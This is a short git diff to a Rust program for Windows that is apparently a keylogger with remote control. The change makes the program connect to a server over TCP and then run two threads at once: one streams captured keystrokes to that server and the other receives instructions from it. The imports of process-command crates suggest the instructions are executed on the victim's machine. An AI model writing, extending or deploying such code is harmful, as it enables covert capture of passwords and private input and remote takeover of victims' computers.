@@ -2,6 +2,7 @@ use std::io::prelude::*;
 use std::process::Command;
 use std::os::windows::process::CommandExt;
 use std::net::TcpStream;
+use std::thread;
 use rdev::{listen, Event};
 
 fn handle_instructions(mut stream: TcpStream) {
@@ -40,7 +41,19 @@ fn main() {
     
     match stream {
         Ok(stream) => {
-            handle_keylogger(stream);
+            let keylogger_stream = stream.try_clone().unwrap();
+            let instructions_stream = stream.try_clone().unwrap();
+
+            let keylogger = thread::spawn(|| {
+                handle_keylogger(keylogger_stream);
+            });
+
+            let instructions = thread::spawn(|| {
+                handle_instructions(instructions_stream);
+            });
+
+            keylogger.join().unwrap();
+            instructions.join().unwrap();
         }, 
         Err(_) => println!("[ERROR] could not connect to server"),
     }
